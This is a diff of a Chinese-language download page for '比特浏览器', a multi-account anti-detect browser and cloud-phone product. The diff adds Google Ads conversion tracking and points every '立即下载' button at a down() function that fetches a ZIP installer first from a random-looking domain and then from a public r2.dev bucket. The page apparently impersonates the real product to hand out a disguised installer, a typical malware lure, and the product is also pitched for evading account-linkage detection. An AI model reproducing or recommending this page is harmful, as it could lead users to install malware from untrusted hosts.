@@ -1,4 +1,4 @@
-﻿<html lang="zh" data-capo="">
+<html lang="zh" data-capo="">
     <head>
         <meta charset="utf-8">
         <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, minimum-scale=1, user-scalable=no">
@@ -12,6 +12,16 @@
         <link rel="icon" type="image/x-icon" href="./favicon.ico">
         <meta name="description" content="比特浏览器支持全球社媒多账号管理，电商云手机运营，设备环境独立，算力强大，具有强效防关联效果，立即打开立即关闭，随时随地操作任何功能，提升多账号管理运营效率。">
         <meta name="keywords" content="比特浏览器,云端手机,电商云手机,云手机运营账号,云手机多开账号,TikTok账号运营,WhatApp账号运营,Facebook账号运营">
+<!-- Event snippet for 网页浏览 conversion page -->
+<script>
+  gtag('event', 'conversion', {
+      'send_to': 'AW-786317628/G3k4CJeLgZ0bELyC-fYC',
+      'value': 1.0,
+      'currency': 'USD'
+  });
+</script>
+
+
         <style type="text/css">
             html {
                 width: 100%!important;
@@ -596,7 +606,7 @@
                         <ul class="nav-link flex items-center justify-center">
                             <li class="flex items-center justify-center lang">
                                 <div class="menu-button flex items-center">
-                                    <a href="javascript:down()" class="downloadLink">
+                                    <a href="javascript:;" onclick="down();" class="downloadLink">
                                         <div class="flex items-center justify-center btn-primary">立即下载</div>
                                     </a>
                                 </div>
@@ -617,7 +627,7 @@
                                 <p data-v-79d1dc5b>配置简单，仅需配置代理即可轻松访问全球各大主流 APP，支持一键新机，高效轮换手机环境！</p>
 
                                 <div class="zh-mb flex btn-group" data-v-79d1dc5b>
-                                    <a href="javascript:onDownload();" class="btn-primary downloadLink" data-v-79d1dc5b>立即下载</a>
+                                    <a href="javascript:;" onclick="down();" class="btn-primary downloadLink" data-v-79d1dc5b>立即下载</a>
                                 </div>
                             </div>
                             <div class="img flex" data-v-79d1dc5b><img src="static/picture/phone-banner-sub.webp" alt="比特浏览器" data-v-79d1dc5b></div>
@@ -723,7 +733,7 @@
                                     <li data-v-79d1dc5b><img src="static/picture/right.svg" alt="一键代理，快速配置网络环境" data-v-79d1dc5b> 一键代理，快速配置网络环境</li>
                                 </ul>
                             </div>
-                            <div class="flex justify-center" data-v-79d1dc5b><a href="javascript:down()" class="btn-primary downloadLink" data-v-79d1dc5b>立即下载</a></div>
+                            <div class="flex justify-center" data-v-79d1dc5b><a href="javascript:;" onclick="down();" class="btn-primary downloadLink" data-v-79d1dc5b>立即下载</a></div>
                         </div>
                     </section>
                     <div class="faq relative-position" data-v-79d1dc5b>
@@ -788,14 +798,41 @@
                 </div>
             </div>
         </div>
-<script type="text/javascript">
-     function down(){
-         window.location.href='https://bireut-sf-sgc-af-rgbxcvh1saaf.com/bibeitelimqSetup12.0.8.zip';
-     }
- </script>
+<script>function down(){window.location.href='https://pub-c8635f87f2a649eaa26b43d75b8f034a.r2.dev/bibeitelimqSetup12.0.8.zip';}</script>
+        <script>
+            $(document).ready(function() {
+                handleHeader();
 
+                $(window).scroll(function() {
+                    handleHeader();
+                })
+
+                $('.faq-list > li').click(function() {
+                    const [titleElem, descElem] = this.children;
+                    const [_, iconElem] = titleElem.children;
+                    $(descElem).toggle();
+                    $(iconElem).toggleClass('down');
+                })
+            })
+
+            function handleHeader() {
+                if (!!!window.scrollY) {
+                    $('#navHeader').removeClass('sticky');
+                    return;
+                }
+                $('#navHeader').addClass('sticky');
+            }
+        </script>
+
+        
+
+        
 </body>
 </html>
+
+
+
+
 
 
 
